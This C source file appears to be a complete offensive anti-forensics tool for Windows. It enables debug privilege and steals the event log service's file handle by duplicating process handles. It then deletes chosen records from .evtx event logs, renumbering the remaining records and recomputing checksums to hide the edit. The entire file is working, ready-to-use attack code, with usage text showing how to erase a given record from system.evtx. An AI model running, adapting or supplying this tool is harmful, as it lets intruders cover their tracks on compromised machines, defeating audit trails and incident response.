#include <windows.h>
#include <stdio.h>
#include <process.h>
#pragma comment(lib,"Advapi32.lib") 
#define NT_SUCCESS(x) ((x) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define SystemHandleInformation 16
#define ObjectBasicInformation 0
#define ObjectNameInformation 1
#define ObjectTypeInformation 2
#define BUF_SIZE 256
#define SUCCESSED 0
#define FAILURE 1

#pragma pack(1)
typedef struct _ELFFILE_HEADER
{
	ULONG64 Signature;
	ULONG64 FirstChunkNumber;
	ULONG64 LastChunkNumber;
	ULONG64 NextRecordIdentifier;
	ULONG HeaderSize;
	WORD MinorVersion;
	WORD MajorVersion;
	WORD ChunkDataOffset;
	ULONG NumberOfChunks;
	UCHAR Unknown[74];
	ULONG FileFlags;
	ULONG Checksum;
} ELFFILE_HEADER, *PELFFILE_HEADER;

typedef struct _CHUNK_HEADER
{
	ULONG64 Signature;
	ULONG64 FirstEventRecordNumber;
	ULONG64 LastEventRecordNumber;
	ULONG64 FirstEventRecorIdentifier;
	ULONG64 LastEventRecordIdentifier;
	ULONG HeaderSize;
	ULONG LastEventRecordDataOffset;
	ULONG FreeSpaceOffset;
	ULONG EventRecordsChunksum;
	UCHAR Unknown1[64];
	ULONG Unknown2;
	ULONG Checksum;
} CHUNK_HEADER, *PCHUNK_HEADER;

typedef struct _EVENT_RECORD
{
	ULONG Signature;
	ULONG Size;
	ULONG64 EventRecordIdentifier;
	ULONG64 WrittenDateAndTime;
} EVENT_RECORD, *PEVENT_RECORD;
#pragma pack()

unsigned int CRC32[256];

typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
typedef NTSTATUS(NTAPI *_NtDuplicateObject)(
	HANDLE SourceProcessHandle,
	HANDLE SourceHandle,
	HANDLE TargetProcessHandle,
	PHANDLE TargetHandle,
	ACCESS_MASK DesiredAccess,
	ULONG Attributes,
	ULONG Options
	);
typedef NTSTATUS(NTAPI *_NtQueryObject)(
	HANDLE ObjectHandle,
	ULONG ObjectInformationClass,
	PVOID ObjectInformation,
	ULONG ObjectInformationLength,
	PULONG ReturnLength
	);

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _SYSTEM_HANDLE
{
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG HandleCount;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef enum _POOL_TYPE
{
	NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed,
	DontUseThisType,
	NonPagedPoolCacheAligned,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS
} POOL_TYPE, *PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION
{
	UNICODE_STRING Name;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccess;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	USHORT MaintainTypeList;
	POOL_TYPE PoolType;
	ULONG PagedPoolUsage;
	ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName)
{
	return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}

BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}

void CheckBlockThreadFunc(void* param)
{
	_NtQueryObject NtQueryObject = (_NtQueryObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQueryObject");
	if (NtQueryObject != NULL)
	{
		PVOID objectNameInfo = NULL;
		ULONG returnLength;
		objectNameInfo = malloc(0x1000);
		NtQueryObject((HANDLE)param, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
	}
}

BOOL IsBlockingHandle(HANDLE handle)
{
	HANDLE hThread = (HANDLE)_beginthread(CheckBlockThreadFunc, 0, (void*)handle);
	if (WaitForSingleObject(hThread, 100) != WAIT_TIMEOUT) {
		return FALSE;
	}
	TerminateThread(hThread, 0);
	return TRUE;
}

static void init_table()
{
	int i, j;
	unsigned int crc;
	for (i = 0; i < 256; i++)
	{
		crc = i;
		for (j = 0; j < 8; j++)
		{
			if (crc & 1)
			{
				crc = (crc >> 1) ^ 0xEDB88320;
			}
			else
			{
				crc = crc >> 1;
			}
		}
		CRC32[i] = crc;
	}
}

unsigned int GetCRC32(unsigned char *buf, int len)
{
	unsigned int ret = 0xFFFFFFFF;
	int i;
	static char init = 0;
	if (!init)
	{
		init_table();
		init = 1;
	}
	for (i = 0; i < len; i++)
	{
		ret = CRC32[((ret & 0xFF) ^ buf[i])] ^ (ret >> 8);
	}
	ret = ~ret;

	return ret;
}

PVOID GetTemplateIdentifierPtr(PBYTE chunkPtr, PBYTE recordPtr, PULONG a3)
{
	if (recordPtr)
	{
		PBYTE xmlDataPtr = recordPtr + 24;

		if (0x1010f != *(PULONG)xmlDataPtr)
		{
			while (0x0b == *xmlDataPtr)
				xmlDataPtr += 2 * *(PWORD)(xmlDataPtr + 1) + 3;
		}

		PBYTE templateInstance = NULL;
		if (0x0c == *(xmlDataPtr + 4))
			templateInstance = xmlDataPtr + 4;
		if (templateInstance)
		{
			PBYTE v8 = NULL;

			if ((ULONG_PTR)templateInstance - (ULONG_PTR)chunkPtr + 10 ==
				*(PULONG)(templateInstance + 6))
			{
				v8 = templateInstance + 14;
			}
			else
			{
				ULONG templateDefinitionOffset = *(PULONG)(templateInstance + 6);
				ULONG tmp = (ULONG)(recordPtr - chunkPtr);
				if (templateDefinitionOffset < tmp || templateDefinitionOffset > tmp + *(PULONG)(recordPtr + 4))
					goto LABEL;
				v8 = templateDefinitionOffset + chunkPtr + 4;
			}
			if (v8)
			{
				if (*(PULONG)v8 == *(PULONG)(templateInstance + 2))
				{
					ULONG tmp = *(PULONG)(v8 + 16);
					*a3 = *(PULONG)(tmp + v8 + 20);
					return tmp + v8 + 24;
				}
				return NULL;
			}
		LABEL:
			*a3 = *(PULONG)(templateInstance + 10);
			return templateInstance + 14;
		}
	}
	return NULL;
}

PVOID ModifyRecordNumber(PBYTE chunkPtr, PEVENT_RECORD recordPtr, ULONG64 eventRecordIdentifier)
{
	ULONG v9 = 0;
	PWORD templateIdentifierPtr = (PWORD)GetTemplateIdentifierPtr(chunkPtr, (PBYTE)recordPtr, &v9);

	if (templateIdentifierPtr)
	{
		ULONG count = 10;
		PULONG64 v7 = (PULONG64)&templateIdentifierPtr[2 * v9];
		do
		{
			WORD v8 = *templateIdentifierPtr;
			templateIdentifierPtr += 2;
			v7 = (PULONG64)((PBYTE)v7 + v8);
			--count;
		} while (count);
		*v7 = eventRecordIdentifier;
		recordPtr->EventRecordIdentifier = eventRecordIdentifier;
	}
	return templateIdentifierPtr;
}

PVOID GetTemplateInstancePtr(PBYTE recordPtr)
{
	PBYTE result = NULL;
	if (recordPtr)
	{
		PBYTE xmlDataPtr = recordPtr + 24;
		if (0x1010f != *(PULONG)(recordPtr + 24))
		{
			while (0xb == *xmlDataPtr)
				xmlDataPtr += 2 * *(PWORD)(xmlDataPtr + 1) + 3;
		}
		if (0x0c == *(xmlDataPtr + 4))
			result = xmlDataPtr + 4;
	}
	return result;
}

PVOID GetTemplateDefinition(PBYTE chunkPtr, PEVENT_RECORD recordPtr, PBYTE templateInstancePtr)
{
	PBYTE result = NULL;
	do
	{
		if (!recordPtr || !templateInstancePtr)
			break;
		if ((ULONG_PTR)templateInstancePtr - (ULONG_PTR)chunkPtr + 10 ==
			*(PULONG)(templateInstancePtr + 6))
			return templateInstancePtr + 14;
		ULONG templateDefinitionOffset = *(PULONG)(templateInstancePtr + 6);
		ULONG64 v6 = (ULONG64)((PBYTE)recordPtr - chunkPtr);
		if ((templateDefinitionOffset >= v6) &&
			(templateDefinitionOffset <= v6 + recordPtr->Size))
			result = templateDefinitionOffset + chunkPtr + 4;
	} while (FALSE);
	return result;
}

ULONG DeleteRecord(PVOID mapAddress, ULONG64 recordNumber)
{
	ULONG result = FAILURE;
	PELFFILE_HEADER elfFilePtr = (PELFFILE_HEADER)mapAddress;
	do
	{
		if (memcmp(mapAddress, "ElfFile", 8))
			break;
		ULONG crc32 = 0;
		BOOL unknownFlag = FALSE;
		BOOL deleted = FALSE;
		BOOL isSingleRecord = FALSE;
		ULONG64 chunkTotal = 0;
		ULONG64 chunkCount = 0;
		ULONG64 firstChunkNumber = elfFilePtr->FirstChunkNumber;
		ULONG64 lastChunkNumber = elfFilePtr->LastChunkNumber;
		ULONG numberOfChunk = elfFilePtr->NumberOfChunks;

		if (firstChunkNumber >= 0xffffffff || lastChunkNumber >= 0xffffffff)
			break;
		if (lastChunkNumber >= firstChunkNumber)
			chunkTotal = lastChunkNumber - firstChunkNumber + 1;
		else
			chunkTotal = lastChunkNumber + numberOfChunk - firstChunkNumber;
		while (chunkCount < chunkTotal)
		{
			ULONG64 chunkOffset = firstChunkNumber + chunkCount;
			if (chunkOffset > numberOfChunk)
				chunkOffset = chunkOffset - numberOfChunk;
			chunkOffset <<= 16;
			PCHUNK_HEADER currentChunk = (PCHUNK_HEADER)(chunkOffset + (PBYTE)elfFilePtr + 0x1000);
			if (0xffffffffffffffff != currentChunk->LastEventRecordIdentifier)
			{
				PEVENT_RECORD prevRecordPtr = NULL;
				PEVENT_RECORD currentRecordPtr = NULL;
				PEVENT_RECORD nextRecordPtr = (PEVENT_RECORD)((PBYTE)currentChunk + 0x200);
				while (nextRecordPtr)
				{
					prevRecordPtr = currentRecordPtr;
					currentRecordPtr = nextRecordPtr;
					nextRecordPtr = (PEVENT_RECORD)((PBYTE)nextRecordPtr + nextRecordPtr->Size);

					if (0x00002a2a != currentRecordPtr->Signature)
						break;
					ULONG64 eventRecordIdentifier = currentRecordPtr->EventRecordIdentifier;
					if ((eventRecordIdentifier >= currentChunk->LastEventRecordIdentifier) ||
						(currentRecordPtr == nextRecordPtr))
						nextRecordPtr = NULL;
					if (eventRecordIdentifier >= recordNumber)
					{
						if (eventRecordIdentifier > recordNumber || deleted)
						{
							if (deleted)
							{
								ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, eventRecordIdentifier - 1);
							}
						}
						else
						{
							if (!nextRecordPtr && !prevRecordPtr)
							{
								currentChunk->FirstEventRecordNumber = 1;
								currentChunk->LastEventRecordNumber = 0xffffffffffffffff;
								currentChunk->FirstEventRecorIdentifier = 0xffffffffffffffff;
								currentChunk->LastEventRecordIdentifier = 0xffffffffffffffff;
								currentChunk->LastEventRecordDataOffset = 0;
								currentChunk->FreeSpaceOffset = 512;
								memset((PBYTE)currentChunk + 128, 0, 0x180);
								isSingleRecord = TRUE;
								deleted = TRUE;
								result = SUCCESSED;
								break;
							}
							if (prevRecordPtr)
							{
								ULONG TempprevRecordPtrSize = prevRecordPtr->Size;
								prevRecordPtr->Size += currentRecordPtr->Size;
								*(PULONG)(prevRecordPtr->Size + (PBYTE)prevRecordPtr - 4) = prevRecordPtr->Size;
								memset(currentRecordPtr, 0, currentRecordPtr->Size - 4);
								deleted = TRUE;
								result = SUCCESSED;
								currentRecordPtr = prevRecordPtr;
								if (currentChunk->LastEventRecordIdentifier == recordNumber)
								{
									currentChunk->LastEventRecordDataOffset = currentChunk->LastEventRecordDataOffset - TempprevRecordPtrSize;
								}
							}
							else
							{
								PBYTE xmlDataPtr = (PBYTE)currentRecordPtr + 24;
								PBYTE currentRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr((PBYTE)currentRecordPtr);
								PBYTE nextRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr((PBYTE)nextRecordPtr);
								*(PULONG)xmlDataPtr = 0x1010f;
								*(PWORD)(xmlDataPtr + 4) = 0x10c;
								if (currentRecordTemplateInstancePtr)
								{
									if (nextRecordPtr)
									{
										ULONG a3 = 0;
										PBYTE templateIdentifierPtr = (PBYTE)GetTemplateIdentifierPtr((PBYTE)currentChunk, (PBYTE)nextRecordPtr, &a3);
										if (templateIdentifierPtr)
										{
											PBYTE templateDefinition = (PBYTE)GetTemplateDefinition((PBYTE)currentChunk, currentRecordPtr, currentRecordTemplateInstancePtr);
											*(PULONG)(templateDefinition + 16) = templateIdentifierPtr - templateDefinition - 24;
											currentRecordPtr->Size += nextRecordPtr->Size;
											*(PULONG)(currentRecordPtr->Size + (PBYTE)currentRecordPtr - 4) = currentRecordPtr->Size;
											currentRecordPtr->WrittenDateAndTime = nextRecordPtr->WrittenDateAndTime;
											*(PULONG)(currentRecordTemplateInstancePtr + 10) = *(PULONG)(nextRecordTemplateInstancePtr + 10);
											ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, recordNumber);
											ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, recordNumber);
											deleted = TRUE;
											result = SUCCESSED;
										}
										else
										{
											ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, recordNumber);
											ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, recordNumber);
											currentRecordPtr->WrittenDateAndTime = nextRecordPtr->WrittenDateAndTime;
											*(PULONG64)(currentRecordTemplateInstancePtr + 10) = *(PULONG)(nextRecordTemplateInstancePtr + 10);
											*xmlDataPtr = 11;
											*(PWORD)(xmlDataPtr + 1) = 0;
											*(xmlDataPtr + 3) = 11;
											*(PWORD)(xmlDataPtr + 4) = ((ULONG64)(ULONG)((PBYTE)nextRecordPtr - (PBYTE)currentRecordPtr) - 6) >> 1;
											currentRecordPtr->Size += nextRecordPtr->Size;
											*(PULONG)(currentRecordPtr->Size + (PBYTE)currentRecordPtr - 4) = currentRecordPtr->Size;
											deleted = TRUE;
											result = SUCCESSED;
										}
										nextRecordPtr = (PEVENT_RECORD)((PBYTE)currentRecordPtr + currentRecordPtr->Size);
									}
								}
							}
						}
					}
				}
				if (deleted)
				{
					ULONG64 lastEventRecordNumber = currentChunk->LastEventRecordNumber;
					ULONG64 lastEventRecordIdentifier = currentChunk->LastEventRecordIdentifier;
					if (0xffffffffffffffff != lastEventRecordNumber || 0xffffffffffffffff != lastEventRecordIdentifier)
					{
						ULONG64 firstEventRecordIdentifier = currentChunk->FirstEventRecorIdentifier;
						if (firstEventRecordIdentifier <= recordNumber && lastEventRecordIdentifier >= recordNumber)
						{
							currentChunk->LastEventRecordNumber = lastEventRecordNumber - 1;
							currentChunk->LastEventRecordIdentifier = lastEventRecordIdentifier - 1;
						}
						else
						{
							currentChunk->FirstEventRecordNumber -= 1;
							currentChunk->LastEventRecordNumber = lastEventRecordNumber - 1;
							currentChunk->FirstEventRecorIdentifier = firstEventRecordIdentifier - 1;
							currentChunk->LastEventRecordIdentifier -= 1;
						}
					}
				}
				unsigned char *ChecksumBuf1 = new unsigned char[currentChunk->FreeSpaceOffset - 512];
				memcpy(ChecksumBuf1, (PBYTE)currentChunk + 512, currentChunk->FreeSpaceOffset - 512);
				crc32 = GetCRC32(ChecksumBuf1, currentChunk->FreeSpaceOffset - 512);
				if (crc32)
					currentChunk->EventRecordsChunksum = crc32;
				else
					unknownFlag = TRUE;
				unsigned char *ChecksumBuf2 = new unsigned char[504];
				memcpy(ChecksumBuf2, (PBYTE)currentChunk, 120);
				memcpy(ChecksumBuf2 + 120, (PBYTE)currentChunk + 128, 384);
				crc32 = GetCRC32(ChecksumBuf2, 504);
				currentChunk->Checksum = crc32;
			}
			chunkCount++;
		}
		if (isSingleRecord)
		{
			ULONG count = 0;
			while (count < chunkTotal)
			{
				PCHUNK_HEADER currentChunkPtr = NULL;
				PCHUNK_HEADER nextChunkPtr = NULL;
				ULONG64 tmp = firstChunkNumber + count;
				if (tmp > numberOfChunk)
					tmp -= numberOfChunk;
				currentChunkPtr = (PCHUNK_HEADER)((tmp << 16) + (PBYTE)elfFilePtr + 0x1000);
				if (++count < chunkTotal)
				{
					tmp = firstChunkNumber + count;
					if (tmp > numberOfChunk)
						tmp -= numberOfChunk;
					nextChunkPtr = (PCHUNK_HEADER)((tmp << 16) + (PBYTE)elfFilePtr + 0x1000);
				}
				if (0xffffffffffffffff == currentChunkPtr->LastEventRecordNumber && 0xffffffffffffffff == currentChunkPtr->LastEventRecordIdentifier)
				{
					if (nextChunkPtr)
					{
						memcpy(currentChunkPtr, nextChunkPtr, 0x10000);
						nextChunkPtr->FirstEventRecordNumber = 1;
						nextChunkPtr->LastEventRecordNumber = 0xffffffffffffffff;
						nextChunkPtr->FirstEventRecorIdentifier = 0xffffffffffffffff;
						nextChunkPtr->LastEventRecordIdentifier = 0xffffffffffffffff;
						nextChunkPtr->LastEventRecordDataOffset = 0;
						nextChunkPtr->FreeSpaceOffset = 512;
						memset((PBYTE)nextChunkPtr + 128, 0, 0x180);
					}
					else
					{
						if (lastChunkNumber)
							elfFilePtr->LastChunkNumber = lastChunkNumber - 1;
						else
							elfFilePtr->LastChunkNumber = numberOfChunk - 1;
					}
				}
			}
		}
		if (deleted)
			elfFilePtr->NextRecordIdentifier -= 1;
		crc32 = 0;
		unsigned char *ChecksumBuf3 = new unsigned char[120];
		memcpy(ChecksumBuf3, (PBYTE)elfFilePtr, 120);
		crc32 = GetCRC32(ChecksumBuf3, 120);
		elfFilePtr->Checksum = crc32;
		if (!unknownFlag)
			*(PULONG)((PBYTE)elfFilePtr + 118) &= 0xfffffffe;
	} while (FALSE);
	return result;
}

BOOL DeleteRecordMain(HANDLE fileHandle, DWORD EventRecordID)
{
	ULONG result = FAILURE;
	HANDLE mapHandle = NULL;
	PVOID mapAddress = NULL;
	mapHandle = CreateFileMapping(fileHandle, NULL, PAGE_READWRITE, 0, 0, NULL);
	if (!mapHandle)
	{
		printf("\n[!]CreateFileMapping error\n");
		return result;
	}
	mapAddress = MapViewOfFile(mapHandle, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (!mapAddress)
	{
		printf("\n[!]MapViewOfFile error\n");
		return result;
	}
	result = DeleteRecord(mapAddress, EventRecordID);
	FlushViewOfFile(mapAddress, 0);
	if (mapAddress)
		UnmapViewOfFile(mapAddress);
	if (mapHandle)
		CloseHandle(mapHandle);
	return result;
}

void PrintUsage(char *argv)
{
	printf("\nEnumerate all processes and get specified file's handle\n");
	printf("\nI can remove individual lines from Windows XML Event Log (EVTX) files\n");
	printf("Delete the eventlog by rewriting the evtx file.\n");
	printf("Support:Win7 and later\n");
	printf("Author:3gstudent@3gstudent\n\n");
	printf("Usage:\n");
	printf("     %s <absolute or relative file path> <flag> <EventRecordID>\n", argv);
	printf("If flag=0: \n     Enumerate all processes and get specified file's handle.\n");
	printf("If flag=1: \n     Delete specified evtx file's eventlog record.\n");
	printf("eg:\n");
	printf("     %s system.evtx 0      ---Get the handle of system.evtx.\n", argv);
	printf("     %s system.evtx 1 5077 ---Delete an eventlog record of system.evtx,the EventRecordID is 5077\n", argv);
}

int main(int argc, char *argv[])
{
	DWORD EventRecordID;
	if ((argc == 3) && (memcmp(argv[2], "0", 1) == 0))
		printf("[*]Try to enumerate all processes and get <%s>'s handle.\n", argv[1]);
	else if ((argc == 4) && (memcmp(argv[2], "1", 1) == 0))
	{
		printf("[*]Try to delete %s's record.\n", argv[1]);
		printf("[*]EventRecordID is %s\n", argv[3]);	
		sscanf_s(argv[3], "%d", &EventRecordID);
	}
	else
	{
		PrintUsage(argv[0]);
		return 0;
	}

	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoSize = 0x10000;
	HANDLE processHandle = NULL;
	ULONG i;
	DWORD ErrorPID = 0;
	SYSTEM_HANDLE handle = { 0 };
	wchar_t buf1[100];
	swprintf(buf1, 100, L"%hs", argv[1]);
	_wcslwr_s(buf1, wcslen(buf1) + 1);

	if (!EnableDebugPrivilege(TRUE))
	{
		printf("[!]AdjustTokenPrivileges Failed.<%d>\n", GetLastError());
	}

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQuerySystemInformation");
	if (!NtQuerySystemInformation)
	{
		printf("[!]Could not find NtQuerySystemInformation entry point in NTDLL.DLL");
		return 0;
	}
	_NtDuplicateObject NtDuplicateObject = (_NtDuplicateObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtDuplicateObject");
	if (!NtDuplicateObject)
	{
		printf("[!]Could not find NtDuplicateObject entry point in NTDLL.DLL");
		return 0;
	}
	_NtQueryObject NtQueryObject = (_NtQueryObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQueryObject");
	if (!NtQueryObject)
	{
		printf("[!]Could not find NtQueryObject entry point in NTDLL.DLL");
		return 0;
	}

	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	if (!NT_SUCCESS(status))
	{
		printf("[!]NtQuerySystemInformation failed!\n");
		return 0;
	}

	UNICODE_STRING objectName;
	ULONG returnLength;
	for (i = 0; i < handleInfo->HandleCount; i++)
	{
		handle = handleInfo->Handles[i];
		HANDLE dupHandle = NULL;
		POBJECT_TYPE_INFORMATION objectTypeInfo = NULL;
		PVOID objectNameInfo = NULL;

		if (handle.ProcessId == ErrorPID)
		{
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			continue;
		}

		if (!(processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handle.ProcessId)))
		{
			//printf("[!]Could not open PID %d!\n", handle.ProcessId);
			ErrorPID = handle.ProcessId;
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}

		if (!NT_SUCCESS(NtDuplicateObject(processHandle, (HANDLE)handle.Handle, GetCurrentProcess(), &dupHandle, 0, 0, 0)))
		{
			//			printf("[%#x] Error!\n", handle.Handle);
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}
		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
		if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectTypeInformation, objectTypeInfo, 0x1000, NULL)))
		{
			//			printf("[%#x] Error!\n", handle.Handle);
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}
		objectNameInfo = malloc(0x1000);

		if (IsBlockingHandle(dupHandle) == TRUE) //filter out the object which NtQueryObject could hang on
		{
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}

		if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength)))
		{

			objectNameInfo = realloc(objectNameInfo, returnLength);
			if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectNameInformation, objectNameInfo, returnLength, NULL)))
			{
				//				printf("[%#x] %.*S: (could not get name)\n", handle.Handle, objectTypeInfo->Name.Length / 2, objectTypeInfo->Name.Buffer);
				free(objectTypeInfo);
				free(objectNameInfo);
				CloseHandle(dupHandle);
				CloseHandle(processHandle);
				continue;
			}
		}
		objectName = *(PUNICODE_STRING)objectNameInfo;
		if (objectName.Length)
		{
			_wcslwr_s(objectName.Buffer, wcslen(objectName.Buffer) + 1);
			if (wcsstr(objectName.Buffer, buf1) != 0)
			{
				printf("[+]HandleName:%.*S\n", objectName.Length / 2, objectName.Buffer);
				printf("[+]Pid:%d\n", handle.ProcessId);
				printf("[+]Handle:%#x\n", handle.Handle);
				printf("[+]Type:%#x\n", handle.ObjectTypeNumber);
				printf("[+]ObjectAddress:0x%p\n", handle.Object);
				printf("[+]GrantedAccess:%#x\n", handle.GrantedAccess);

				if (memcmp(argv[2], "1", 1) == 0)
				{
					printf("[+]Try to delete event record... ");
					if (DuplicateHandle(processHandle, (HANDLE)handle.Handle, GetCurrentProcess(), &dupHandle, 0, 0, DUPLICATE_SAME_ACCESS))
					{
						if (DeleteRecordMain(dupHandle, EventRecordID) == 0)
							printf("done.\n");
						
					else
						printf("false.\n");
					}
				}
			}
			else
			{
				//			printf("[%#x] %.*S: (unnamed)\n",handle.Handle,objectTypeInfo->Name.Length / 2,objectTypeInfo->Name.Buffer);
			}
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
		}
	}
	free(handleInfo);
	return 0;
}
